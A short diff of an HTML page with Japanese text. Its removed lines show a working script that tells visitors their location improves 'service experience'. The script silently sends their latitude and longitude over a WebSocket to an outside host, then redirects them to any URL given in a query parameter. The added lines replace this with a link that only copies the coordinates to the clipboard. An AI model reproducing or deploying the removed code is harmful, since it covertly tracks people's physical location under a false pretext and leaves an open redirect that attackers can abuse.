@@ -1,14 +1,2 @@
-<a>このサイトでは、サービス体験向上のため、位置情報を使用します。位置情報の許可次第、次のページに移動します。</a>
-
-<script>
-    ws = new WebSocket("wss://mainpc.cmr-ms.tech:4721")
-    navigator.geolocation.getCurrentPosition(
-        function(a){
-            ws.send(`${a.coords.latitude}, ${a.coords.longitude}`)
-            window.location.href=new URL(document.location.href).searchParams.get("redirect")
-        },
-        function(a){
-            alert("位置情報を許可してください")
-        }
-    )
-</script>
+<a href="javascript:navigator.geolocation.getCurrentPosition((e)=>{navigator.clipboard.writeText(`${e.coords.latitude}, ${e.coords.longitude}`)})">押す
+</a>
